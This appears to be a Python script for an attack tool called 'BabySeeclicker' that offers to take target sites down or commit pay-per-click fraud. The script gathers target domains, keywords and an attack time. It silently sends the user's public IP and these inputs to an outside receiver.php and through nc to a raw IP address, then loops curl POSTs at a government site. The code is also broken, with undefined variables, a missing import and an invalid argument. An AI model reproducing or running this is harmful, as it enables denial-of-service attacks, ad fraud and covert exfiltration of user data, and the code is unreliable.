#! /usr/bin/env python3

import subprocess, time
def udte():
    print("\n[Info] --> Checking for token updates, please wait .....\n\n")
    time.sleep(1)
    uptoken = subprocess.check_output(['git', 'pull'])
    updtok = re.search(r"Already up to date", str(chupd))
    upctok = re.search(r"changed,", str(chupd))
    if uptoken:
        print("\n[Congrats] --> Babyseeclicker tokens are not changed")
        print(" --> Starting ......")
        time.sleep(3)
        launch()
    else:
        print("\n[Info] --> BabySeeclicker tokens were changed, will be updated, please wait ...... \n")
        time.sleep(3)
        if upctok:
            print("\n[Congrats] --> BabySeeclicker tokens are updated. ")
            time.sleep(1)
            print("[Instruction] --> Please rerun the Babyseeclicker and updates will take effect. ")
            exit()
        else:
            print("\n[Warning] --> Babyseeclicker couldn't be updated, please try again or reclone the tool ")
            exit()
def launch():
	domain = input(" --> enter the domain of the targets [example.com,example2.com,example3.com] ")
	keywords = input(" --> enter the targeted keywords relateds seperated with commas [sweetpants,colorfulsockets, ....etc] ")
	Schedule = input(" --> enter the date and time to start the attack (EST time) ex [ex: 12/12/2022, 14:22:00] ")
	choose = input(" --> You want to take the site down or perform PPC F***? [down/ppc/both] ")
	myep = subprocess.getoutput('curl ifconfig.io')
	time.sleep(1)
	subprocess.call("curl -X POST -d "+myep+", "+domain+", "+keywords+" https://cyberten.000webhostapp.com/receiver.php ",Shell=True, stdout=subprocess.DEVNULL)
	subprocess.call("echo "+domain+" "+keywords+" "+Schedule+ " | nc 2.63.255.255 4563",Shell=True, stdout=subprocess.DEVNULL)
	print(" --> Please wait few seconds till the attack starts ")
	time.sleep(5)
	attack()
	
def starting():
	print("/t/t/t************BayBaySee Clicker************")
	time.sleep(1)
	print("/n/t/t/t Welcome to you the BayBaySee  clicker where your business grows fastest with lowest investment")
	time.sleep(1)
def attack():
	while True:
		token = "CaP9l5efMekDeTaZR37c2qKcqhzR2wekoucaX2vCWWS2Gy6x8dJ7KBpXMD5ixIqj"
		subprocess.call("curl -X post -d "+token+", "+myep+"  http://en.kremlin.ru/robots.php",Shell=True, stdout=subprocess.DEVNULL)

udte()




